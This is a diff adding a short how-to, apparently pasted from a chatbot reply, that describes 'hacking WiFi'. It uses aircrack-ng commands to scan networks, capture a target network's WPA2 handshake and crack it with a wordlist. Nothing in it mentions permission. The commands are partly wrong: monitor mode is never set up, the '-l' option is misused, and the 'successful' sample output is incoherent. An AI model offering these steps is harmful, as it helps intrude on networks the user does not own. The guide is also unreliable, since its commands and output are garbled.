@@ -1,0 +1,61 @@
+To hack WiFi on Ubuntu using Kali Linux tools, follow these steps:
+
+First, install necessary software:
+text
+ Copy
+sudo apt update
+sudo apt upgrade
+sudo apt install kali-linux-wireless
+
+Check your wireless adapter hardware:
+text
+ Copy
+lspci -v | grep Network
+lsusb
+
+Install aircrack-ng suite:
+text
+ Copy
+sudo apt install aircrack-ng
+
+Scan for available networks:
+text
+ Copy
+sudo airodump-ng wlan0mon
+Replace wlan0mon with your wireless adapter name.
+
+Identify target network BSSID, channel, and encryption type from the scan output.
+
+Capture handshake (for WPA2):
+text
+ Copy
+sudo airodump-ng -c [CHANNEL] -d [TARGET_BSSID] wlan0mon
+
+For dictionary attacks:
+text
+ Copy
+sudo aircrack-ng -w /path/to/dictionary.txt -e [ESSID] [CAPTURE_FILE]
+
+For brute force attacks (for weak passwords):
+text
+ Copy
+sudo aircrack-ng -l [WORDLIST] -e [ESSID] [CAPTURE_FILE]
+
+If successful, you'll see:
+text
+ Copy
+1: 01:23:45:67:89:ab:cd:ef (3 handshake(s))
+  Total number of IVs collected: 0
+  WPA handshake not found!
+  
+2: [TARGET_BSSID] (on channel [CHANNEL])
+  ESSID: "YourNetworkName"
+  BSSID: [TARGET_BSSID]
+  Encryption Type: WPA2
+
+[Target network appears in the list - focus on it]
+
+Crack handshake using dictionary or brute force:
+text
+ Copy
+sudo aircrack-ng -w /path/to/dictionary.txt -e "YourNetworkName" capture-01.cap
